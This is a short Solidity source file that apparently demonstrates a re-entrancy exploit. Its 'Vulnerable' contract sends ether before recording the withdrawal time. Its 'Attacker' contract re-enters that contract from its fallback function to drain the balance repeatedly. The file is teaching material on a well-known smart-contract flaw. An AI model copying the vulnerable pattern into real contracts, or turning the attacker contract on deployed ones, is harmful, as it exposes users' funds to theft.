// SPDX-License-Identifier: MIT
// A simple re-entrancy exploit

pragma solidity 0.8.10;

// Allows withdrawal of 10 wei to any account only once a week
contract Vulnerable
{
    mapping (address => uint256) public lastWithdrawn;
    
    // To fund while deploying the contract
    constructor() payable {}
    
    function transferEther() public
    {
        require(block.timestamp >= lastWithdrawn[msg.sender] + 1 weeks, "Withdrawals should be a week apart");
        
        // Call fallback() and send 10 wei
        msg.sender.call{value: 10 wei}("");
        
        lastWithdrawn[msg.sender] = block.timestamp;
    }

    function tellBalance() public view returns (uint256) 
    {
        return address(this).balance;
    }
}

contract Attacker
{
    Vulnerable public v;
    
    constructor (address vulnerableContract) payable
    {
        v = Vulnerable(vulnerableContract);
    }
    
    function attack() public
    {
        v.transferEther{gas:30000000}();
    }

    fallback() external payable 
    {
        v.transferEther();
    }

    function tellBalance() public view returns (uint256) 
    {
        return address(this).balance;
    }
}
